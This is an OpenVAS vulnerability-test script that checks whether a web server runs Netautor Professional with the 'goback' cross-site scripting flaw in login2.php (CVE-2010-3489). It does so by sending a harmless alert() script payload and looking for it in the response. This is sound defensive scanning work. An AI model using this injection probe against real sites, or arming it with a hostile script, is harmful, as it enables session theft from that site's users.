##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_netautor_professional_xss_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Netautor Professional 'login2.php' Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a user's browser session in the context of an affected
  site.
  Impact Level: Application.";
tag_affected = "Netautor Professional version 5.5.0 and prior";

tag_insight = "The flaw is due to the input passed to the 'goback' parameter in
  'netautor/napro4/home/login2.php' is not properly sanitised before
  being returned to the user.";
tag_solution = "No solution or patch is available as of 29th September, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/napro/files/Netautor Professional/";
tag_summary = "This host is running Netautor Professional and is prone Cross Site
  Scripting Vulnerability.";

if(description)
{
  script_id(902316);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-10-05 07:29:45 +0200 (Tue, 05 Oct 2010)");
  script_cve_id("CVE-2010-3489");
  script_bugtraq_id(43290);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Netautor Professional 'login2.php' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41475");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1009-exploits/ZSL-2010-4964.txt");
  script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4964.php");

  script_description(desc);
  script_summary("Check Netautor Professional is vulnerable to XSS attack");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}
		

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP port
npPort = get_http_port(default:80);
if(!get_port_state(npPort)){
  exit(0);
}

foreach dir (make_list("/netautor", "/", cgi_dirs()))
{
  ## Send and Receive Response
  sndReq = http_get(item:string(dir , "/napro4/index.php"), port:npPort);
  rcvRes = http_send_recv(port:npPort, data:sndReq);

  ## Check application is Netautor Professional
  if("<title>Netautor Professional Application Server</title>" >< rcvRes)
  {
    ## Try an exploit
    sndReq = http_get(item:string(dir , '/napro4/home/login2.php?goback="<script>' +
                                  'alert("OpenVAS-XSS-Testing")</script>'), port:npPort);
    rcvRes = http_send_recv(port:npPort, data:sndReq);

    ## Check the Response to confirm vulnerability
    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:rcvRes) &&
                    '<script>alert("OpenVAS-XSS-Testing")</script>' >< rcvRes){
      security_warning(npPort);
    }
  }
}
